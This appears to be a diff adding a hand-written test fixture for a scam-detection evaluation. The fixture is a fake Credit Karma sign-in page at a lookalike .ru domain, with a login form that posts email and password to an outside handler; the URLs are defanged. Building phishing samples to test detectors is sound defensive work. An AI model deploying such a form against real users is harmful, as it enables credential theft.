@@ -1,0 +1,13 @@
+# Synthetic page fixture for ScamSentinel evaluation (P2b). Hand-written, not a real page.
+# Plain text on purpose: never rename it to .html or open it in a browser.
+url: hxxps://creditkarma.com.secure-login[.]ru
+status: 200
+---
+<html><head><title>Credit Karma - Sign in</title></head>
+<body>
+<form action="hxxps://ck-form-handler[.]ru/post" method="post">
+  <input type="email" name="email" placeholder="Email">
+  <input type="password" name="password" placeholder="Password">
+  <button>Sign in</button>
+</form>
+</body></html>
